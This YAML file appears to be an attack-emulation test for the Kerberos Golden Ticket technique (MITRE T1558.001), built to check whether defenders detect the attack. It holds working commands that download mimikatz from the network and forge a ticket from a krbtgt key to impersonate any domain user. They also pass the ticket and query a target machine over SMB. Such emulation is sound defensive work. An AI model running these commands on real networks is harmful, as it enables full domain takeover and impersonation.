attack_technique: T1558.001
display_name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
atomic_tests:
- name: Crafting golden tickets with mimikatz
  auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
  description: |
    Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.
    This test crafts a Golden Ticket and then performs an SMB request with it, thus triggering a service ticket request (event ID 4769).
  supported_platforms:
    - windows
  input_arguments:
    domain_sid:
      description: Sid of the targeted domain
      type: string
      default: S-1-5-21-1723555596-1415287819-2705645101
    domain:
      description: Targeted domain
      type: string
      default: example.com
    account:
      description: Account to impersonate
      type: string
      default: goldenticketfakeuser
    krbtgt_aes256_key:
      description: Krbtgt AES256 key
      type: string
      default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
    machine:
      description: machine to target (without domain suffix) with crafted golden ticket
      type: string
      default: server
    mimikatz_path:
      description: Mimikatz windows executable
      type: path
      default: '%tmp%\mimikatz\x64\mimikatz.exe'
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
    prereq_command: |
      $mimikatz_path = cmd /c echo #{mimikatz_path}
      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
    get_prereq_command: |
      $mimikatz_path = cmd /c echo #{mimikatz_path}
      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      klist purge
      #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:#{domain_sid} /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit"
      net view \\#{machine}.#{domain}
      echo End of Golden Ticket attack
    cleanup_command: |
      klist purge